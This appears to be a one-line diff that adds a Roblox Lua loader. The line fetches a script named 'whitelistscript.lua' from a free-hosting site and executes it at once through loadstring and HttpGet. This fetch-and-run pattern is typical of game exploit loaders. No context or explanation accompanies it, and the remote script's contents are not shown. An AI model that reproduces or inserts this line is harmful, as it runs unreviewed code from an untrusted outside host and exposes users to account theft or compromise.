@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://sunless-hip.000webhostapp.com/whitelistscript.lua", true))()
